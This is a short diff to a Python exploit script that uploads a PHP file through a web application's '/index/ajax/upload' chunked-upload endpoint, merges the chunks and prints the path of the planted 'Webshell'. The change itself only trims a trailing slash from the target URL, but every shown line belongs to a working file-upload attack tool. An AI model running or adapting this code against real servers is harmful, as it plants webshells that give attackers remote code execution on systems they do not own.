@@ -19,7 +19,7 @@ def banner():
 	""")
 
 def upload_chunk(url):
-	upload_url = url + '/index/ajax/upload'
+	upload_url = url.rstrip('/') + '/index/ajax/upload'
 	file = {
 		'file': ('%d.php' % time(), open('hhh.php', 'rb'), 'application/octet-stream')
 	}
@@ -39,7 +39,7 @@ def upload_chunk(url):
 	result = loads(resp.text)
 	if result['code'] == 1 and result['msg'] == '' and result['data'] == None:
 		merge_file(upload_url, chunk_id)
-		print('\nWebshell: %s/%d.php' % (url, chunk_id))
+		print('\nWebshell: %s/%d.php' % (url.rstrip('/'), chunk_id))
 	else:
 		print('Not Vulnerability.')
 
